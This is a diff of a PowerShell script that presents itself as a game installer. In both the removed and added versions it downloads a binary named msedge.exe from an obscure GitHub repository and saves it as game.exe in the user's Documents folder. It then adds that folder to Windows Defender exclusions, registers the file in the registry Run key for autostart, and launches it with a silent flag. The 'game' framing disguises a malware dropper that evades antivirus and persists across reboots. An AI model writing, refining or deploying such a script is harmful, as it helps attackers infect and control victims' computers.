@@ -1,51 +1,70 @@
-# Check if running with administrator privileges
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # If not running as admin, restart with admin privileges
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+# Define specific paths for your game - using a location that should definitely work
+$gameFolder = "$env:USERPROFILE\Documents\MyGame"  # This uses your user Documents folder
+$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
+$downloadPath = "$gameFolder\game.exe"
+$autoStartName = "MyGame"
+
+Write-Host "Starting installation process..."
+
+# Create the game directory 
+try {
+    New-Item -ItemType Directory -Path $gameFolder -Force -ErrorAction Stop
+    Write-Host "Created directory: $gameFolder"
+} catch {
+    Write-Host "Error creating directory: $_"
     exit
 }
 
-# Define specific paths for your game
-$gameFolder = "C:\Games\MyGame"  # Change this to your actual game folder
-$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
-$downloadPath = "$gameFolder\game.exe"  # Save the game executable in the game folder
-$autoStartName = "MyGame"
-
-# Create the game directory if it doesn't exist
-if (-not (Test-Path -Path $gameFolder)) {
-    New-Item -ItemType Directory -Path $gameFolder -Force
+# Verify the folder exists
+if (Test-Path -Path $gameFolder) {
+    Write-Host "Confirmed folder exists: $gameFolder"
+} else {
+    Write-Host "ERROR: Folder does not exist even after creation attempt"
+    exit
 }
 
-# Add only the specific game folder to Defender exclusions
+# Add the specific game folder to Defender exclusions
 try {
     Add-MpPreference -ExclusionPath $gameFolder -ErrorAction Stop
-    Write-Host "Added exclusion for game folder: $gameFolder"
+    Write-Host "Added exclusion for: $gameFolder"
 } catch {
-    Write-Host "Could not add exclusion. Continuing anyway."
+    Write-Host "Could not add exclusion: $_"
 }
 
 # Download the executable to the game folder
 try {
+    Write-Host "Attempting to download from: $downloadUrl"
+    Write-Host "Downloading to: $downloadPath"
     Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
-    Write-Host "Downloaded game to: $downloadPath"
+    
+    # Verify the file exists
+    if (Test-Path -Path $downloadPath) {
+        Write-Host "Download confirmed successful: $downloadPath"
+    } else {
+        Write-Host "ERROR: Download appeared to succeed but file not found"
+        exit
+    }
 } catch {
-    Write-Host "Download failed."
+    Write-Host "Download failed: $_"
     exit
 }
 
-# Add to auto-start (optional, comment out if not needed)
+# Add to auto-start
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 try {
     Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
-    Write-Host "Added game to startup programs."
+    Write-Host "Added to startup programs"
 } catch {
-    Write-Host "Could not add to startup. Continuing anyway."
+    Write-Host "Could not add to startup: $_"
 }
 
 # Launch the executable
 try {
-    Start-Process -FilePath $downloadPath -ArgumentList "/silent" -Wait
-    Write-Host "Game launched successfully."
+    Write-Host "Attempting to launch: $downloadPath"
+    Start-Process -FilePath $downloadPath -ArgumentList "/silent"
+    Write-Host "Launch command sent"
 } catch {
-    Write-Host "Failed to launch game."
+    Write-Host "Failed to launch: $_"
 }
+
+Write-Host "Script completed"
